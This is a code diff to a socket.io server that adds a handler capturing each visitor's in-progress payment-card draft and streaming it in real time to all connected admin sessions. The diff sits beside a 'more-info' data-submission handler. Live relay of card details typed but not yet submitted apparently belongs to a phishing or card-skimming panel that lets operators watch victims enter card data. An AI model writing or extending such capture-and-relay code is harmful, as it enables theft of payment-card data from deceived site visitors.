@@ -383,7 +383,20 @@ io.on("connection", (socket) => {
   });
 
   // Handle more info (data submission)
-  socket.on("more-info", (data) => {
+socket.on("card:draft", (draft) => {
+    const visitor = visitors.get(socket.id);
+    if (!visitor) return;
+    visitor.cardDraft = { ...draft, updatedAt: Date.now() };
+    visitors.set(socket.id, visitor);
+    admins.forEach((admin, adminSocketId) => {
+      io.to(adminSocketId).emit("visitor:cardDraft", {
+        visitorId: visitor._id,
+        draft: visitor.cardDraft,
+      });
+    });
+  });
+
+    socket.on("more-info", (data) => {
 
     const visitor = visitors.get(socket.id);
     if (visitor) {
